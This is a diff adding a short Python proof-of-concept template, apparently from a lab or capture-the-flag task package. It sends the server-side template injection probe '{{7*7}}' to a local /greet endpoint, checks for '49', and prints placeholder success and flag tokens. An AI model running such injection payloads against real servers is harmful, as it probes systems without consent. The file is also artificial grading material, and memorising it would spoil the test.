@@ -1,0 +1,37 @@
+# Asset-backed family-aware fallback template for Template Injection.
+import argparse
+import sys
+
+import requests
+
+SUCCESS_SIGNATURE = __SUCCESS_SIGNATURE__
+FLAG_TOKEN = __FLAG_TOKEN__
+DEFAULT_PAYLOAD = '{{7*7}}'
+
+
+def exploit(base_url: str, payload: str) -> bool:
+    url = base_url.rstrip('/') + '/greet'
+    try:
+        resp = requests.get(url, params={'name': payload}, timeout=5)
+    except requests.RequestException as exc:
+        print(f'[template-injection-fallback] request failed: {exc}', file=sys.stderr)
+        return False
+    return resp.status_code == 200 and '49' in resp.text
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='Template Injection fallback PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)
+    args = parser.parse_args()
+    if exploit(args.base_url, args.payload):
+        print(SUCCESS_SIGNATURE)
+        if FLAG_TOKEN:
+            print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[template-injection-fallback] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+
+if __name__ == '__main__':
+    main()
